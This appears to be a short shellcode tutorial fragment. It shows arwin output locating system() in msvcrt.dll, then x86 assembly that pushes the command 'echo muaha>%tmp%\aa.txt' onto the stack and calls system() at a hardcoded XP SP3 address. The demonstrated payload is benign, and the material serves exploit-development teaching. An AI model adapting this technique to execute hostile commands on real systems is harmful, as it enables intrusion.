C:\WINDOWS\system32>arwin.exe msvcrt system
arwin - win32 address resolution program - by steve hanna - v.01
system is located at 0x77c293c7 in msvcrt

System - msvcrt: 0x77c293c7

; push into the stack, in reverse order, the command 'echo muaha>%tmp%\aa.txt' adding a NULL byte
PUSH 0x00747874 ; push txt\x00
PUSH 0x2e61615C ; push \aa.
PUSH 0x25706d74 ; push tmp%
PUSH 0x253e6168 ; ha>%
PUSH 0x61756d20 ; push <space>mua
PUSH 0x6f686365 ; push echo
MOV EDI,ESP ; adding a pointer to the stack
PUSH EDI
MOV EAX,0x77c293c7 ; calling the System() function using the hardcoded address (XP SP3)
CALL EAX
